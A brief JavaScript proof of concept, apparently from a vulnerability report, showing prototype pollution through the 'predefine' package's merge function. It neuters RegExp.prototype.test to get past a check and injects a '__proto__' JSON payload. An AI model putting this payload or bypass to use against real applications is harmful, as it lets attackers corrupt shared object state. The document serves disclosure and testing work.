RegExp.prototype.test = () => true;
console.log({}.polluted);
var predefine = require('predefine');
const payload = JSON.parse('{"__proto__":{"polluted":"yes"}}');
predefine.merge({}, payload);
console.log({}.polluted);